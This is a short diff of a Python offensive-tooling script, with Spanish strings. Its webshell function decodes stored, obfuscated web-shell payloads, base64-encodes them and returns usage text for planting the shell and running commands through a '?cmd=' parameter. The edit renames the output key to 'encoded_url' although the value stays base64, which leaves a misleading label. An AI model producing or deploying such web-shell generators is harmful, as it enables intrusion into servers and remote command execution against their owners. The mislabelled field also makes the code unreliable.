@@ -17,7 +17,7 @@ def webshell(lang="php"):
         return {"error": f"Lenguaje no soportado: {lang}. Usa: {keys}"}
     decoded = _d(_W[lang])
     enc = base64.b64encode(decoded.encode()).decode()
-    return {"language":lang,"payload":decoded,"encoded_b64":enc,"usage":"Colocar en archivo ."+lang+" y acceder via: shell."+lang+"?cmd=comando"}
+    return {"language":lang,"payload":decoded,"encoded_url":enc,"usage":"Colocar en archivo ."+lang+" y acceder via: shell."+lang+"?cmd=comando"}
 
 def encode_payload(payload, method="b64"):
     r = {"original":payload,"method":method,"encoded":""}
